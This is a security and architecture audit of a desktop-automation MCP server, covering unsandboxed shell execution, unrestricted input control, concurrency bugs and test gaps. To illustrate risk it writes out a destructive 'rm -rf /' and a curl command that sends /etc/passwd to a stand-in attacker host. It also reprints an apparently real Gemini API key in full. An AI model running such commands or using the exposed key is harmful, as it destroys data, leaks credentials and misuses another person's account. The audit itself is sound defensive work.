# Comprehensive Architectural Audit: Computer-Use MCP Server

> **Audit Date:** 2026-06-17  
> **Auditor:** Architect Mode (Zoo)  
> **Codebase Version:** Current HEAD  
> **Files Audited:** 35 source files across src/, bridges/, platforms/, scripts/, tests/, scratch/, and root config  
> **Maturity Rating:** 55/100 — Experimental prototype with meaningful recent improvements, but significant production gaps remain

---

## 1. Project Purpose & Architecture

### 1.1 Primary Purpose

Computer-Use is an MCP (Model Context Protocol) server that exposes Open Interpreter desktop automation capabilities to MCP clients such as Claude Desktop, OpenFang, and MCP Inspector. It provides a full computer-use surface: desktop UI scanning, mouse/keyboard control, screenshots, shell execution, browser launch + DOM extraction, and optional deep browser automation via a delegated `browser-use` subprocess.

### 1.2 System Architecture

```mermaid
graph TD
    subgraph MCP_Clients
        CD[Claude Desktop]
        OF[OpenFang]
        MI[MCP Inspector]
        VC[Voice WebSocket Client]
    end

    subgraph Transport_Layer
        STDIO[stdio transport]
        SSE[SSE transport]
        HTTP[HTTP transport]
        WS[WebSocket - voice only]
    end

    subgraph Core_Server
        SP[server.py - Standard Mode]
        HSP[hybrid_server.py - Hybrid Mode]
    end

    subgraph Tool_Surface
        COMP[computer tool]
        RSU[read_screen_ui tool]
        BASH[bash tool]
        BA[browser_action tool]
        BUD[browser_use_dom tool]
        RF[rename_file tool]
        UT[update_thought tool]
        TT[terminate_task tool]
    end

    subgraph Hybrid_Browser_Proxy
        BUP[BrowserUseProxy]
        BU_SUB[browser-use subprocess]
    end

    subgraph UI_Scanning
        UIE[ui_elements.py - Windows UIAutomation]
        CDP[CDP via Playwright]
    end

    subgraph Overlay
        OVL[overlay.py - MouseOverlay]
        LW[Windows Layered Window]
    end

    subgraph Voice_Pipeline
        VS[voice_server.py]
        SPROC[speech_processor.py]
        ASR_B[bridges/asr_server.py]
        TTS_B[bridges/tts_server.py]
    end

    subgraph Agent_Runner
        RA[run_agent.py]
        MC[mcp_complex_prompt_llm.py]
    end

    subgraph Configuration
        CFG[config.py - ServerConfig]
        ENV[.env + .env.example]
    end

    subgraph Bridges
        ASR_ENV[asr_env/ - qwen-asr]
        TTS_ENV[tts_env/ - qwen-tts]
    end

    CD --> STDIO --> SP
    OF --> STDIO --> SP
    MI --> HTTP --> SP
    VC --> WS --> VS

    SP --> COMP
    SP --> RSU
    SP --> BASH
    SP --> BA
    SP --> BUD
    SP --> RF
    SP --> UT
    SP --> TT

    HSP --> SP
    HSP --> BUP --> BU_SUB

    RSU --> UIE
    BUD --> CDP
    COMP --> OVL --> LW

    VS --> SPROC
    SPROC --> ASR_B
    SPROC --> TTS_B
    ASR_B --> ASR_ENV
    TTS_B --> TTS_ENV

    RA --> SP
    MC --> SP

    SP --> CFG
    VS --> CFG
    SP --> ENV
```

### 1.3 Operating Modes

| Mode | Entry Point | Tools | Best For |
|------|------------|-------|----------|
| Standard | [`src/server.py`](src/server.py) | computer, read_screen_ui, bash, browser_action, browser_use_dom, rename_file, update_thought, terminate_task | Desktop automation, screenshots, shell |
| Hybrid | [`src/hybrid_server.py`](src/hybrid_server.py) | All standard + bu_* delegated browser tools | Mixed desktop + rich browser workflows |
| Voice | [`src/voice_server.py`](src/voice_server.py) | WebSocket loop with MCP tools + ASR/TTS | Voice-driven desktop automation |
| Agent | [`src/run_agent.py`](src/run_agent.py) / [`src/mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py) | Standalone VLM agent loop | Self-contained agent execution |

### 1.4 Core Components

| Path | Lines | Purpose |
|------|-------|---------|
| [`src/server.py`](src/server.py) | 1264 | Main MCP server — tool implementations, screenshot, mouse/keyboard, shell |
| [`src/hybrid_server.py`](src/hybrid_server.py) | 409 | Hybrid mode — delegates bu_* tools to browser-use subprocess |
| [`src/config.py`](src/config.py) | 244 | Pydantic-settings configuration with full validation |
| [`src/overlay.py`](src/overlay.py) | 937 | Windows layered-window overlay with per-pixel alpha |
| [`src/ui_elements.py`](src/ui_elements.py) | 557 | UIAutomation + CDP-based element scanning |
| [`src/run_agent.py`](src/run_agent.py) | 1032 | Multi-provider VLM agent loop (Anthropic, OpenAI, Gemini, local) |
| [`src/voice_server.py`](src/voice_server.py) | 588 | WebSocket voice interaction loop |
| [`src/speech_processor.py`](src/speech_processor.py) | 577 | ASR (Whisper, Qwen3) + TTS (Kokoro, Edge, Kitten, Supertonic, Qwen3) |
| [`src/capture_service.py`](src/capture_service.py) | 150 | Continuous screen/audio capture (not integrated) |
| [`src/mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py) | 293 | Streaming LLM client for local models with overlay integration |
| [`src/run_complex_mcp_prompt.py`](src/run_complex_mcp_prompt.py) | 52 | Demo runner using mcp_complex_prompt_llm |
| [`bridges/asr_server.py`](bridges/asr_server.py) | 75 | FastAPI bridge for Qwen3 ASR over HTTP |
| [`bridges/tts_server.py`](bridges/tts_server.py) | 108 | FastAPI bridge for Qwen3 TTS over HTTP |
| [`platforms/openfang/`](platforms/openfang/) | ~600 | Docker + PowerShell bridge for OpenFang integration |

### 1.5 Main Entry Points

| Entry Point | Usage |
|-------------|-------|
| `python src/server.py --stdio` | Primary MCP server for Claude Desktop / OpenFang |
| `python src/hybrid_server.py --stdio` | Hybrid mode with browser-use proxy |
| `python src/voice_server.py` | WebSocket voice server on port 8086 |
| `python src/run_agent.py --provider local --prompt "..."` | Standalone agent loop |
| `scripts/start.bat --stdio` | Windows launcher |
| `scripts/start.sh --stdio` | Linux/macOS launcher |
| `start_agent.bat` | Windows shortcut for run_agent.py |

---

## 2. Technology Stack

### 2.1 Core Dependencies

| Category | Technology | Version Constraint |
|----------|-----------|-------------------|
| MCP Protocol | `mcp[cli]` | >=1.27 |
| MCP Framework | `fastmcp` | >=3.1 |
| ASGI Server | `uvicorn` | Unpinned |
| Web Framework | `starlette` | Unpinned |
| Configuration | `pydantic` / `pydantic-settings` | >=2.0 |
| Desktop Automation | `pyautogui` | Unpinned |
| Screen Capture | `mss` | Unpinned |
| Image Processing | `pillow` | Unpinned |
| Windows API | `pywin32` | Windows only |
| UI Automation | `uiautomation` | Windows only |
| Browser CDP | `playwright` | Unpinned |
| VLM Client | `openai` | Unpinned |
| HTTP Client | `requests` (sync) / `httpx` (async) | Mixed |

### 2.2 GPU/ML Stack (Optional — Isolated venvs)

| Package | Environment | Conflicts |
|---------|------------|-----------|
| `torch==2.11.0+cu128` | Main + asr + tts | Shared CUDA index |
| `torchaudio==2.11.0+cu128` | Main + asr + tts | Shared CUDA index |
| `qwen-asr` | `asr_env/` only | Requires `transformers==4.57.6` |
| `qwen-tts` | `tts_env/` only | Requires `transformers==4.57.3` |
| `faster-whisper` | Main env | No transformers conflict |

### 2.3 Separate Virtual Environments

| venv | Purpose | Why Separate |
|------|---------|-------------|
| `.venv` / `computer_use_env` | Main MCP server | Core runtime |
| `asr_env/` | Qwen3 ASR bridge | `transformers==4.57.6` pin |
| `tts_env/` | Qwen3 TTS bridge | `transformers==4.57.3` pin |
| `../browser-use/.venv` | Delegated browser automation | Conflicts with OI on rich/typer/psutil |

### 2.4 Python Version & Platform Support

- **Python:** 3.11+ (setup scripts reference 3.11; CPython 3.13 observed in `document.md` logs)
- **Primary platform:** Windows 10/11 (DPI awareness, UIAutomation, win32gui, overlay)
- **Secondary:** Linux via `setup.sh` and `platforms/openfang/bridge.sh` (limited — no UIAutomation, no overlay)
- **Docker:** `platforms/openfang/Dockerfile` (Ubuntu 22.04 + VNC — legacy OpenFang integration)

### 2.5 Dependency Graph & Conflicts

```mermaid
graph LR
    subgraph Main_Venv
        MCP[mcp + fastmcp]
        PA[pyautogui]
        MSS[mss]
        PW[playwright]
        UA[uiautomation - Win only]
        FW[faster-whisper]
        OI[open-interpreter - editable]
    end

    subgraph ASR_Venv
        QA[qwen-asr]
        T6[transformers==4.57.6]
    end

    subgraph TTS_Venv
        QT[qwen-tts]
        T3[transformers==4.57.3]
    end

    subgraph BU_Venv
        BU[browser-use]
    end

    QA --> T6
    QT --> T3
    T6 -.->|CONFLICT| T3

    BU -.->|Conflicts on rich/typer/psutil| OI
```

**Critical finding:** The `qwen-tts` ↔ `qwen-asr` transformers conflict is a **fundamental packaging incompatibility** that cannot be resolved in a single venv. The current architecture of separate venvs with HTTP bridges is the correct approach, but the bridge servers have their own issues (see Section 3).

---

## 3. Critical Issues (Deploy-Blocking)

### 3.1 🔴 CRITICAL: API Key Leaked in `.env` File

**File:** [`.env`](.env:2)  
**Severity:** CRITICAL — Security vulnerability

```
GEMINI_API_KEY=AIzaSyDDOkcpsCVxvWGlIt3cTVweCYeOvEl3mEE
```

The `.env` file contains a real Google Gemini API key committed to the repository. While `.gitignore` does not explicitly exclude `.env`, this key is exposed in the working directory and was likely committed to version control history.

**Impact:** Anyone with repository access can exfiltrate the key, consume API quota, or access Google services under the owner's account.

**Remediation:**
1. Immediately revoke the exposed Gemini API key
2. Add `.env` to `.gitignore` (currently missing)
3. Use `.env.example` for documentation only — no real keys
4. Audit git history for previously committed keys
5. Consider using a secrets manager for CI/CD

---

### 3.2 🔴 CRITICAL: Unrestricted Shell Execution — No Sandboxing

**File:** [`src/server.py`](src/server.py:1022-1053) (bash tool)  
**Severity:** CRITICAL — Security

The `bash` tool executes arbitrary shell commands with no sandboxing, resource limits, or command allowlisting. Any MCP client can run any command as the current user, including:

- Filesystem destruction: `rm -rf /`
- Network exfiltration: `curl -d @/etc/passwd https://attacker.com`
- Privilege escalation: `powershell -Command "..."` 

While the agent runner in [`mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py:142-162) has a toy filter (`_is_writey_shell`, `_is_disallowed_shell`), it is:
1. Trivially bypassable — e.g., `python -c "import os; os.remove('/important/file')"`
2. Not applied in the MCP server itself — only in the local runner
3. Lacks path allowlisting — `rename_file` has no path restrictions
4. No rate limiting or resource constraints on spawned processes

**Impact:** Any MCP client with access to this server has full user-level system control.

**Remediation:**
1. Add a configurable command allowlist/denylist at the MCP server level
2. Run the bash tool in a sandboxed subprocess (e.g., AppContainer on Windows)
3. Set process timeouts and memory limits
4. Restrict filesystem access to allowed directories
5. Add audit logging for all shell commands

---

### 3.3 🔴 CRITICAL: Mouse/Keyboard Control Unrestricted — No Confirmation

**File:** [`src/server.py`](src/server.py:460-700)  
**Severity:** CRITICAL — Safety

The `computer` tool provides unrestricted mouse and keyboard control. Any MCP client can:
- Click any screen coordinate including security dialogs
- Type arbitrary keystrokes including credential entry
- Take screenshots of sensitive content (passwords, messages, financial data)
- No confirmation dialogs, rate limits, or user-in-the-loop safeguards

**Impact:** A compromised or misconfigured MCP client can perform any UI action the user could, including dismissing security warnings, authorizing transactions, or extracting visible sensitive data via screenshots.

**Remediation:**
1. Add user confirmation for destructive actions (configurable)
2. Implement screenshot redaction for known sensitive regions
3. Add rate limiting for input events
4. Consider a "trusted client" allowlist with configurable permission tiers
5. Log all input actions with timestamps for audit trail

---

### 3.4 🔴 CRITICAL: Double Registration of `browser_action` and `browser_use_dom` Tools

**File:** [`src/server.py`](src/server.py:1237-1238)  
**Severity:** CRITICAL — Bug / Protocol violation

```python
# Line ~1237: These tools are @app.tool-decorated functions above,
# then re-registered again at the bottom of create_server()
app.add_tool(browser_action)
app.add_tool(browser_use_dom)
```

Both `browser_action` and `browser_use_dom` are registered twice: once via their `@app.tool()` decorator at definition time, and again via explicit `app.add_tool()` calls in `create_server()`. This causes:
- Duplicate tool listings in MCP tool enumeration
- Potential routing ambiguity when a client calls these tools
- Protocol violation — MCP clients may error on duplicate tool names

**Remediation:** Remove the explicit `app.add_tool()` calls at lines 1237-1238, keeping only the `@app.tool()` decorated versions.

---

### 3.5 🔴 CRITICAL: Synchronous Blocking Screenshot in Async Context

**File:** [`src/server.py`](src/server.py:607-647)  
**Severity:** CRITICAL — Concurrency / Performance

[`_capture_desktop_png_base64()`](src/server.py:607-647) calls `mss.grab()` synchronously inside an async function. This blocks the entire event loop for the duration of the screen capture (~20-50ms). On high-resolution displays or multi-monitor setups, this can take longer, causing:

- Tool call timeouts for concurrent requests
- SSE/HTTP transport stalls
- Voice server jitter when sharing the same process

The function is called in:
- [`computer()`](src/server.py:934-937) — screenshot action
- [`computer()`](src/server.py:810-814) — post-action screenshot
- [`read_screen_ui()`](src/server.py:973-977) — pre-scan screenshot

**Remediation:** Wrap `mss.grab()` in `loop.run_in_executor()` to move it off the event loop thread.

---

### 3.6 🔴 CRITICAL: Voice Server Imports Synchronous `requests` Inside Async Function

**File:** [`src/run_agent.py`](src/run_agent.py:456) / [`src/speech_processor.py`](src/speech_processor.py:505)  
**Severity:** CRITICAL — Concurrency

[`call_gemini()`](src/run_agent.py:449-600) does `import requests` and makes a synchronous `requests.post()` call inside an async function via `loop.run_in_executor()`. While the executor offloading prevents direct event loop blocking, this:

1. Creates a thread pool scaling issue under load
2. `requests` is not connection-pooling-aware in the same way as `httpx`
3. The `_do_post()` inner function in `speech_processor.py` does the same pattern
4. No connection timeout defaults — could hang indefinitely

**Remediation:** Replace `requests` with `httpx.AsyncClient` for all Gemini API calls. The project already depends on `httpx` transitively through `mcp`.

---

## 4. High Issues (Stability & Reliability)

### 4.1 🟠 HIGH: `.gitignore` is Incomplete — `.env` and Sensitive Files Not Excluded

**File:** [`.gitignore`](.gitignore)  
**Current contents:** Only `.history`, `models`, `*.code-workspace`, `screenshots`

Missing entries that should be present:
- `.env` — contains API keys (CRITICAL — see 3.1)
- `*.log` — server logs may contain sensitive data
- `__pycache__/` and `*.pyc` — compiled Python artifacts
- `scratch/` — temporary test output
- `logs/` — stress test reports with temp file paths
- `*.patch.rej` — rejected patch artifacts
- `computer_use_env/`, `asr_env/`, `tts_env/` — virtual environment directories

**Remediation:** Expand `.gitignore` to cover all generated and sensitive files.

---

### 4.2 🟠 HIGH: Bare `except Exception:` Pattern — Over 80 Occurrences

**Files:** Nearly every source file  
**Severity:** HIGH — Reliability / Debugging

Count of bare `except Exception:` or `except:` blocks across the codebase:

| File | Count | Examples |
|------|-------|---------|
| [`src/server.py`](src/server.py) | ~15 | Lines 194, 222, 334, 346, 369, 402, 420, 440, 463, 711, 900, 931, 999, 1075 |
| [`src/overlay.py`](src/overlay.py) | ~25 | Lines 29, 38, 229, 261, 275, 561, 569, 617-628, 764, 769, 807, 844, 867, 877, 882, 889, 906, 910, 914, 919, 924, 929 |
| [`src/ui_elements.py`](src/ui_elements.py) | ~14 | Lines 96, 122, 381, 397, 407, 446, 446, 472, 474, 488, 495, 999 |
| [`src/run_agent.py`](src/run_agent.py) | ~10 | Lines 145, 152, 167, 268, 363, 402, 771, 811, 826, 861 |
| [`src/voice_server.py`](src/voice_server.py) | ~8 | Lines 125, 137, 202, 245, 292, 392, 413, 533 |
| [`src/speech_processor.py`](src/speech_processor.py) | ~10 | Lines 41, 59, 86, 138, 152, 183, 225, 257, 369, 376, 429, 469, 500, 532 |
| [`bridges/asr_server.py`](bridges/asr_server.py) | ~3 | Lines 25, 63, 69 |
| [`bridges/tts_server.py`](bridges/tts_server.py) | ~3 | Lines 67-75, 100 |

**Impact:**
- Silent failure swallowing — errors that should propagate are hidden
- Impossible to debug intermittent failures
- Error messages returned to VLM are unstructured, making self-correction harder
- Specific exceptions (TimeoutError, PermissionError, ConnectionError) get the same treatment as trivial ones

**Remediation:**
1. Replace bare `except Exception:` with specific exception types
2. Add `logger.error()` with traceback before returning error text
3. Create a structured `ToolError` hierarchy for different failure modes
4. At minimum, add `logger.debug("...", exc_info=True)` in catch blocks

---

### 4.3 🟠 HIGH: No Configuration Validation for Bridge Endpoints

**File:** [`src/speech_processor.py`](src/speech_processor.py:363-455)  
**Severity:** HIGH — Reliability

The `Qwen3ASRProcessor` and `Qwen3TTSProcessor` accept `remote_url` parameters that point to the ASR/TTS bridge servers. However:

1. No validation that the URL is reachable at initialization time
2. No health check before attempting transcription/synthesis
3. No retry logic for transient bridge failures
4. Hard-coded 10-second timeout in [`asr_server.py`](bridges/asr_server.py:429) is not configurable
5. If the bridge server is down, the error is only surfaced after the full VLM turn is wasted

**Remediation:** Add connection validation on startup, health check endpoint, configurable timeouts with exponential backoff retry.

---

### 4.4 🟠 HIGH: Temp File Race Condition in ASR Bridge

**File:** [`bridges/asr_server.py`](bridges/asr_server.py:55-66)  
**Severity:** HIGH — Concurrency / Security

```python
temp_wav = f"scratch/temp_asr_bridge_{os.getpid()}.wav"
contents = await file.read()
with open(temp_wav, "wb") as f:
    f.write(contents)
```

Issues:
1. **PID-based naming is not unique** — under uvicorn with multiple workers, PIDs are reused after worker restarts
2. **Shared `scratch/` directory** — concurrent requests from the same worker PID will overwrite each other's file
3. **No cleanup guarantee** — if the process crashes before `os.remove()`, temp files persist
4. **TOCTOU race** — file is written, then read by a separate `transcribe()` call — another request could overwrite it in between

**Remediation:** Use `tempfile.NamedTemporaryFile(dir='scratch', delete=True)` for atomic, unique temp files with automatic cleanup.

---

### 4.5 🟠 HIGH: `capture_service.py` Not Integrated — Dead Code

**File:** [`src/capture_service.py`](src/capture_service.py)  
**Severity:** HIGH — Code health

`DesktopCaptureService` provides continuous screen capture with FPS control, audio capture via `sounddevice`, and optional Screenpipe API integration. However:

1. Not imported or used anywhere in the main server, hybrid server, or voice server
2. No configuration in [`config.py`](src/config.py) for its settings
3. The voice server re-implements screen capture inline instead of using this service
4. No documentation on how to integrate it

**Remediation:** Either integrate `capture_service.py` into the voice server as the screen/audio capture backend, or remove it and document it as a future feature.

---

### 4.6 🟠 HIGH: Overlay Window Accessible to Other Processes

**File:** [`src/overlay.py`](src/overlay.py:575-599)  
**Severity:** HIGH — Security

The overlay windows (`ComputerUseCursorRing`, `ComputerUsePill`) are created with `WS_EX_TOPMOST | WS_EX_TOOLWINDOW` but no `WS_EX_NOACTIVATE` in the extended style. While the window class has its own WndProc, the window handles are discoverable by other processes via `EnumWindows()` or `FindWindow()`. Other processes could:

1. Send messages to the overlay windows
2. Change overlay text content via `SetWindowText`
3. Modify overlay position/visibility

**Remediation:** Add `WS_EX_NOACTIVATE` to the extended window style. Consider adding a window message filter to reject messages from other processes.

---

### 4.7 🟠 HIGH: Docker Configuration Uses Hardcoded Weak VNC Password

**File:** [`platforms/openfang/Dockerfile`](platforms/openfang/Dockerfile:28-29)  
**Severity:** HIGH — Security

```dockerfile
RUN echo "password" | vncpasswd -f > /home/user/.vnc/passwd
```

The VNC password is hardcoded as `password`. Additionally:
- `user:user` credentials with passwordless sudo
- No SSL/TLS for NoVNC web access (port 8080)
- OpenFang exposed on port 4200 without authentication
- Dockerfile references a nonexistent `scripts/open_interpreter_init.patch` path (should be relative to build context)

**Remediation:** Use Docker secrets or environment variables for VNC password. Remove passwordless sudo. Add TLS termination. Add auth middleware for OpenFang API.

---

### 4.8 🟠 HIGH: Synchronous `requests.post()` in Streaming LLM Client

**File:** [`src/mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py:27)  
**Severity:** HIGH — Concurrency

[`call_local_llm_stream()`](src/mcp_complex_prompt_llm.py:11-104) uses `requests.post(url, json=payload, stream=True, timeout=120)` inside a thread executor. Issues:

1. The 120-second timeout is a hard floor — if the LLM is slow, this blocks the worker thread for up to 2 minutes
2. No streaming timeout — individual chunks may never arrive if the LLM hangs
3. The thread pool is the default `None` (ThreadPoolExecutor max_workers), risking pool exhaustion under concurrent agent runs
4. `asyncio.run_coroutine_threadsafe()` is used from the streaming thread — if the main loop shuts down, this raises `RuntimeError`

**Remediation:** Use `httpx.AsyncClient` with `stream=True` for native async streaming. Or use `openai` SDK which already supports async streaming natively.

---

### 4.9 🟠 HIGH: No Telemetry / Observability

**Files:** All  
**Severity:** HIGH — Operational

The project has:
- `logging` module usage in some files, but no structured logging
- No OpenTelemetry integration
- No metrics export (request latency, tool call success/failure, error rates)
- No distributed tracing for multi-hop calls (server -> browser-use -> VLM)
- No health check endpoint for HTTP mode
- The stress test suite writes JSON reports, but these are not integrated with any monitoring

**Remediation:** Add OpenTelemetry instrumentation, structured logging with correlation IDs, and a `/health` endpoint.

---

## 5. Medium Issues (Production Readiness)

### 5.1 🟡 MEDIUM: Inconsistent Coordinate Handling Between Server and Voice

**Files:** [`src/server.py`](src/server.py:567-604) vs [`src/voice_server.py`](src/voice_server.py:283-557)  
**Severity:** MEDIUM — Correctness

The main server uses a configurable coordinate grid (`MCP_COORDINATE_GRID`, default 0 = raw pixels) via [`_api_xy_to_desktop_xy()`](src/server.py:567-594) and [`_desktop_xy_to_api_xy()`](src/server.py:597-604). The voice server uses a fixed 1000×1000 coordinate grid with no configuration, and its scaling is independent of the main server's grid settings.

If `MCP_COORDINATE_GRID=1000` is set in config, the mappings should ideally align, but:
- Voice server queries `pyautogui.size()` at runtime while server uses `mss` monitor dimensions
- On multi-monitor setups, these can disagree about total desktop size
- The voice server scales to the full virtual desktop, while the main server can capture per-monitor

**Remediation:** Unify coordinate mapping between both servers. Use the config system's `mcp_coordinate_grid` setting in the voice server too.

---

### 5.2 🟡 MEDIUM: Large Commented-Out Code Block in `overlay.py`

**File:** [`src/overlay.py`](src/overlay.py:318-425)  
**Severity:** MEDIUM — Code health

~100 lines of old render code are commented out (lines 318-425). This is dead code that clutters the file and makes it harder to understand the current rendering logic.

**Remediation:** Remove commented-out code. Use git history to recover old implementations if needed.

---

### 5.3 🟡 MEDIUM: `ui_elements.py` Silent ImportError Returns Empty List

**File:** [`src/ui_elements.py`](src/ui_elements.py:382-384)  
**Severity:** MEDIUM — Debugging

```python
try:
    import uiautomation as auto
except ImportError:
    return []  # Silent failure
```

On non-Windows platforms or if `uiautomation` is not installed, `read_screen_ui` returns an empty list with no indication to the caller that scanning is unavailable. The VLM will interpret this as "no UI elements found" rather than "scanning unavailable."

**Remediation:** Return a `TextContent` message explaining that UI scanning is unavailable on this platform, so the VLM can fall back to screenshot-only reasoning.

---

### 5.4 🟡 MEDIUM: `scan_browser()` Catches All Exceptions Generically

**File:** [`src/ui_elements.py`](src/ui_elements.py:120-293)  
**Severity:** MEDIUM — Debugging

The entire `scan_browser()` method is wrapped in a generic `try/except` that returns an error string. This means:
- Connection refused (no browser with CDP) gets the same treatment as a Playwright internal error
- Timeout errors get the same treatment as JavaScript evaluation errors
- No structured error type for callers to programmatically handle

**Remediation:** Differentiate between "no CDP connection available" (expected, non-error) and "CDP connection failed mid-scan" (unexpected, error).

---

### 5.5 🟡 MEDIUM: No Per-Environment Configuration Profiles

**Files:** [`src/config.py`](src/config.py), [`.env.example`](.env.example)  
**Severity:** MEDIUM — Configuration

The current configuration is a flat `.env`-based system. There is no support for:
- Development vs staging vs production profiles
- Environment-specific overlays (dev overlay = more verbose, prod = minimal)
- Feature flags for gradual rollout
- Per-client permission scoping

**Remediation:** Add profile support (e.g., `.env.dev`, `.env.prod`), and a `--profile` CLI flag.

---

### 5.6 🟡 MEDIUM: No Testing for Voice Pipeline or Bridge Servers

**Files:** [`tests/`](tests/)  
**Severity:** MEDIUM — Quality

The test suite covers:
- Coordinate accuracy (manual, requires desktop)
- MCP tool smoke tests (manual, requires desktop)
- Tool enumeration verification
- Stress test suite (end-to-end with a real VLM)

Missing test coverage:
- **Zero unit tests** — all tests are integration/manual
- No tests for `speech_processor.py` (ASR, TTS, VAD)
- No tests for `voice_server.py`
- No tests for `config.py` validation
- No tests for `overlay.py` rendering
- No tests for `bridges/asr_server.py` or `bridges/tts_server.py`
- No tests for error handling paths
- No CI/CD integration

**Remediation:** Add pytest-based unit tests with mocking for all core modules. Add CI with GitHub Actions.

---

### 5.7 🟡 MEDIUM: `run_agent.py` Contains Duplicate Code from `mcp_complex_prompt_llm.py`

**Files:** [`src/run_agent.py`](src/run_agent.py) vs [`src/mcp_complex_prompt_llm.py`](src/mcp_complex_prompt_llm.py)  
**Severity:** MEDIUM — Maintainability

Both files implement:
- MCP client connection and tool listing
- OpenAI tool schema conversion: `_to_openai_tools()` in both
- Tool content extraction: `_tool_content()` in both
- Shell command filtering: `_is_writey_shell()` in mcp_complex_prompt_llm.py (not in run_agent.py)
- VLM calling and tool execution loops

The implementations differ slightly, creating inconsistency bugs:

| Feature | `run_agent.py` | `mcp_complex_prompt_llm.py` |
|---------|---------------|---------------------------|
| Bash filtering | None | `_is_writey_shell() + _is_disallowed_shell()` |
| Streaming | No (full response) | Yes (chunk streaming) |
| Overlay updates | Via `update_thought` in loop | Via inline streaming callback |
| Fallback JSON prompting | Yes (`parse_fallback_json`) | No |
| Multi-provider | Anthropic, OpenAI, Gemini, local | Local only |

**Remediation:** Extract shared MCP client logic into a `src/mcp_client_utils.py` module. Both runners should import from it.

---

### 5.8 🟡 MEDIUM: OpenFang Bridge.ps1 Has Hardcoded Paths

**File:** [`platforms/openfang/bridge.ps1`](platforms/openfang/bridge.ps1:22-23)  
**Severity:** MEDIUM — Portability

```powershell
$projectDir = "d:\Agents-and-other-repos\open-interpreter"
$openfangRepoPath = "D:\Agents-and-other-repos\openfang"
```

These are absolute paths to the developer's local machine. The script will fail on any other system.

**Remediation:** Make paths relative to the script location, or environment-configurable.

---

### 5.9 🟡 MEDIUM: Race in `hybrid_server.py` `_orig_validate` Patching

**File:** [`src/hybrid_server.py`](src/hybrid_server.py:282-284)  
**Severity:** MEDIUM — Concurrency

```python
_orig_validate = mcp_types.JSONRPCMessage.model_validate_json
# ... patching happens ...
```

The `create_server()` function saves and then monkey-patches `JSONRPCMessage.model_validate_json` to work around a serialization issue. This is:
1. A global mutation of a shared type — affects any concurrent use of `mcp_types`
2. Order-dependent — if the import order changes, the workaround may not apply
3. Fragile — any MCP SDK update that changes `model_validate_json` will silently break this

**Remediation:** Report the upstream issue and implement a proper fix. If monkey-patching is necessary, wrap it in a context manager or apply it at the module level with a clear comment explaining why.

---

### 5.10 🟡 MEDIUM: `setup.bat` and `setup.sh` Mutate External Repository

**Files:** [`scripts/setup.bat`](scripts/setup.bat:80-93), [`scripts/setup.sh`](scripts/setup.sh:49-55)  
**Severity:** MEDIUM — Reliability

Both setup scripts modify the Open Interpreter `pyproject.toml` in place (relaxing Python version constraints, updating tiktoken and starlette pins). This is:
1. A side effect on an external repository
2. Not reversible by the setup script (no undo step)
3. Will cause `git status` to show changes in the OI repo
4. Could conflict with future OI updates

**Remediation:** Use `pip install --no-deps` for the specific packages that need override, or maintain a fork/patch file that is applied and reverted atomically.

---

### 5.11 🟡 MEDIUM: Error Messages Returned to LLM are Unstructured

**Files:** [`src/server.py`](src/server.py), [`src/ui_elements.py`](src/ui_elements.py)  
**Severity:** MEDIUM — VLM effectiveness

When tools fail, the error messages returned to the VLM are raw Python exception strings like:
```
Error: [WinError 2] The system cannot find the file specified
```

These are:
- Not actionable for the VLM — it cannot determine if the error is retryable
- Not structured — no error code, no suggested remediation
- Inconsistent — some tools return `str(e)`, others return `repr(e)`

**Remediation:** Create a structured error response format:
```python
{
  "error_type": "FILE_NOT_FOUND",
  "message": "The file could not be found",
  "retryable": False,
  "suggestion": "Check the file path and try again"
}
```

---

## 6. Low Issues (Nice-to-Have)

### 6.1 🔵 LOW: No License File

The README mentions "No license is clearly documented." This should be resolved for any distribution.

### 6.2 🔵 LOW: `setup.bat` References Wrong Step Numbers

**File:** [`scripts/setup.bat`](scripts/setup.bat:99)  
The `echo` statements say `[4/5]` and `[5/5]`, but there are only 5 steps total — should be `[4/5]` and `[5/5]` (correct math) but the initial steps say `[1/4]`.

### 6.3 🔵 LOW: `document.md` Contains Perplexity AI Artifacts

**File:** [`document.md`](document.md)  
This file appears to be a raw paste from a Perplexity AI session with embedded UI chrome and citation markers. It should be cleaned up or removed.

### 6.4 🔵 LOW: `tests/voice_client.html` Not Documented

The HTML WebSocket client for the voice server exists in `tests/` but is not referenced in any documentation or setup guide.

### 6.5 🔵 LOW: No `pyproject.toml` or `setup.py`

The project uses raw `requirements.txt` files instead of modern Python packaging (`pyproject.toml`). This makes the project non-installable via `pip install -e .` and complicates dependency management.

### 6.6 🔵 LOW: `bridge.ps1` README Contains Typo

**File:** [`platforms/openfang/README.md`](platforms/openfang/README.md:8)  
"creates condoms" should likely be "creates conda environments."

### 6.7 🔵 LOW: No Version Pinning in `requirements.txt`

Most dependencies are unpinned (`mss`, `pillow`, `pyautogui`, `playwright`). While this allows flexibility, it also means `pip install -r requirements.txt` can produce different results on different days.

### 6.8 🔵 LOW: `scratch/test_model_direct.py` Hardcodes API Key

**File:** [`scratch/test_model_direct.py`](scratch/test_model_direct.py:6)  
```python
client = openai.AsyncOpenAI(api_key="local-key", base_url="http://127.0.0.1:12345/v1")
```
While `local-key` is not a real key, this pattern sets a bad example. Should use `os.environ.get()`.

---

## 7. Feature Opportunities

### 7.1 High-Value Features

| Feature | Description | Impact |
|---------|------------|--------|
| **Async Screenshot Capture** | Move `mss.grab()` to thread executor | Eliminates main event loop blocking — ~20-50ms per call |
| **Progressive UI Scanning** | Stream UI elements as they are discovered | Faster first-paint for read_screen_ui |
| **Structured Tool Errors** | Error type hierarchy with retryable/suggestion metadata | Dramatically improves VLM self-correction |
| **Request Tracing** | Correlation IDs across VLM → MCP tool → browser-use chain | Critical for debugging multi-hop issues |
| **Coordinate Mapping Validation** | Self-test on startup that verifies DPI scaling is correct | Prevents silent coordinate misalignment on new displays |

### 7.2 Medium-Value Features

| Feature | Description | Impact |
|---------|------------|--------|
| **Browser DOM Caching** | Cache DOM state between tool calls, invalidate on navigation | Reduces redundant CDP scans |
| **Element Highlighting in Screenshots** | Color-code clickable elements in screenshots | VLM can target elements more accurately |
| **Action Templates** | Record/replay common action sequences | Speeds up repetitive tasks |
| **Visual Diff Detection** | Only re-screenshot when screen content changes | Reduces VLM token consumption |
| **Overlay Customization** | Allow MCP clients to control overlay style/visibility | Better UX for different use cases |

### 7.3 Future Features

| Feature | Description | Impact |
|---------|------------|--------|
| **OpenTelemetry Observability** | Structured logging, metrics, distributed tracing | Production monitoring |
